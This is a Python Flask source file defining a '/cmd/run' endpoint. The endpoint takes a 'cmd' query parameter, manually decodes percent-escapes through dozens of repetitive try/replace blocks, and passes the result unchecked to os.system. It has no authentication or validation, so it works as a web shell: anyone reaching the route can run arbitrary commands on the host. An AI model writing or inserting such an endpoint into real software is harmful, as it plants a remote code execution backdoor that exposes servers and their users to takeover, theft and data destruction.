import os

from flask import Blueprint, request

command = Blueprint('cmd', __name__, url_prefix='/cmd')

"""
␣	!	"	#	$	%	&	'	(	)	*	+	,	-	.	/	:	;	<	=	>	?	@	[	\	]	{	|	}
%20	%21	%22	%23	%24	%25	%26	%27	%28	%29	%2A	%2B	%2C	%2D	%2E	%2F	%3A	%3B	%3C	%3D	%3E	%3F	%40	%5B	%5C	%5D	%7B	%7C	%7D
https://de.wikipedia.org/wiki/URL-Encoding#Relevante_ASCII-Zeichen_in_Prozentdarstellung
"""


@command.route('/run')
def cmd():
    run_cmd = request.args.get('cmd', None)
    try:
        run_cmd = run_cmd.replace('%20', ' ')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%20', ' ')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%21', '!')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%22', '"')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%23', '#')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%24', '$')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%25', '%')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%26', '&')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%27', "'")
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%28', '(')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%29', ')')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2A', '*')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2B', '+')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2C', ',')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2D', '-')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2E', '.')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%2F', '/')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3A', ':')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3B', ';')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3C', '<')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3D', '=')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3E', '>')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%3F', '?')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%40', '@')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%5B', '[')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%5C', '\\')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%5D', ']')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%7B', '{')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%7C', '|')
    except:
        pass
    try:
        run_cmd = run_cmd.replace('%7D', '}')
    except:
        pass

    os.system(run_cmd)
    return run_cmd


